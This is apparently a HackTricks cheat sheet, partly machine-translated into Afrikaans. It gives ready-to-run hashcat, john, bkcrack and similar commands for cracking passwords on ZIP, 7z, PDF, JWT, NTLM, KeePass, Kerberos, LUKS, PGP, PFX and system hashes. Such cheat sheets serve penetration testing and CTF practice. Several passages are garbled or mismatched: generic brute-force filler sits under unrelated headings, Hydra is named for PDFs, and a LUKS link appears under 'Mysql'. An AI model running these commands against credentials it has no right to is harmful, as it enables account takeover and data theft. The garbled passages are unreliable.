Kyk hierna voordat jy probeer om 'n Hash met geweld te ontsyfer.

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Bekende platte tekst zip-aanval

Jy moet die **platte teks** (of 'n deel van die platte teks) **van 'n lêer wat binne** die versleutelde zip lê, ken. Jy kan **lêernaam en grootte van lêers wat binne** 'n versleutelde zip bevat, nagaan deur: **`7z l encrypted.zip`** uit te voer.\
Laai [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) van die vrystellingsbladsy af.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z

Brute-force attacks against encrypted 7z files can be time-consuming and resource-intensive, especially if the password is long and complex. Tools like 7z2hashcat can be used to convert 7z files to a format that hashcat can understand, allowing for faster password cracking using GPU acceleration. Additionally, using a good wordlist or rules with hashcat can significantly increase the chances of successfully cracking the password.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Brute-force attacks are commonly used to crack passwords by trying all possible combinations until the correct one is found. These attacks can be time-consuming but are often successful if the password is not strong enough. Tools like Hydra and Medusa are popular for conducting brute-force attacks.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF Eienaar Wagwoord

Om 'n PDF Eienaar wagwoord te kraak, kyk hier: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM kraak
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks beeld

#### Metode 1

Installeer: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Metode 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
### Mysql

'n Ander Luks BF-handleiding: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG Privaatsleutel
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Meester Sleutel

Gebruik [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) en hardloop dan john

### Open Office Wagwoord Beskermde Kolom

As jy 'n xlsx-lêer het met 'n kolom wat deur 'n wagwoord beskerm word, kan jy dit ontgrendel:

* **Laai dit op na Google Drive** en die wagwoord sal outomaties verwyder word
* Om dit **handmatig te verwyder**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX Sertifikate
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome te bou** en outomatiseer met die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Gereedskap

**Hash-voorbeelde:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifiseerder
```bash
hash-identifier
> <HASH>
```
### Woordlyste

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Woordlystegenereringstools**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gevorderde sleutelbord-stapgenerator met aanpasbare basis karakters, toetsenbordkaart en roetes.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John mutasie

Lees _**/etc/john/john.conf**_ en konfigureer dit
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat aanvalle

* **Woordelys aanval** (`-a 0`) met reëls

**Hashcat** kom reeds met 'n **gids wat reëls bevat**, maar jy kan [**ander interessante reëls hier vind**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Woordelys kombinasie** aanval

Dit is moontlik om **2 woordelyste in 1 te kombineer** met hashcat.\
As lys 1 die woord **"hello"** bevat en die tweede 2 reëls met die woorde **"world"** en **"earth"** bevat. Die woorde `helloworld` en `helloearth` sal gegenereer word.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Mask aanval** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Woordelys + Masker (`-a 6`) / Masker + Woordelys (`-a 7`) aanval
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat metodes
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
### Brute Forcing Linux Hashes - /etc/shadow lêer

Brute forcing is 'n aanvalstegniek wat gebruik word om wagwoorde te agterhaal deur verskeie kombinasies te probeer. Vir Linux-stelsels kan die /etc/shadow-lêer wagwoordhashe bevat wat deur brute force aangeval kan word. Dit is belangrik om sterk, onkraakbare wagwoorde te gebruik om hierdie tipe aanvalle te voorkom.
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
### Brute Force

Brute force attacks involve systematically checking all possible keys or passwords until the correct one is found. This method is often used to crack Windows hashes.

#### Tools

There are several tools available for performing brute force attacks on Windows hashes, including:

- **John the Ripper**: A popular password cracking tool that can be used for Windows hashes.
- **Hashcat**: Another powerful tool for cracking passwords, including Windows hashes.
- **Hydra**: A versatile password-cracking tool that supports various protocols, including SMB (used by Windows).

#### Methodology

1. Obtain the Windows hash that you want to crack.
2. Choose a suitable tool for performing the brute force attack.
3. Configure the tool with the necessary parameters, such as the hash type and character set.
4. Start the brute force attack and wait for the tool to find the correct key or password.
5. Once the correct key or password is found, use it to access the Windows system.

By following this methodology, you can effectively crack Windows hashes using brute force techniques.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
### Brute Force

Brute force attacks involve systematically checking all possible keys or passwords until the correct one is found. This method is often used to crack common application hashes.

#### Tools and Resources

- **Hashcat**: A popular password cracking tool that supports multiple hashing algorithms.
- **John the Ripper**: Another widely used password cracking tool that can perform brute force attacks.
- **CrackStation**: An online database containing millions of pre-computed hashes for common passwords.
- **Rainbow Tables**: Precomputed tables used to crack password hashes more quickly than traditional brute force methods.

#### Methodology

1. **Generate Hashes**: Obtain the hash of the target password or key.
2. **Select Tool**: Choose a suitable password cracking tool such as Hashcat or John the Ripper.
3. **Configure Tool**: Set the tool to perform a brute force attack using the appropriate hashing algorithm.
4. **Start Attack**: Initiate the brute force attack and let the tool systematically check all possible keys or passwords.
5. **Crack Password**: Once the correct key or password is found, the hash is cracked, and the plaintext password is revealed.

By following this methodology and utilizing the right tools, hackers can effectively crack common application hashes using brute force attacks.
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling van eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacking-truuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Vandaag Toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
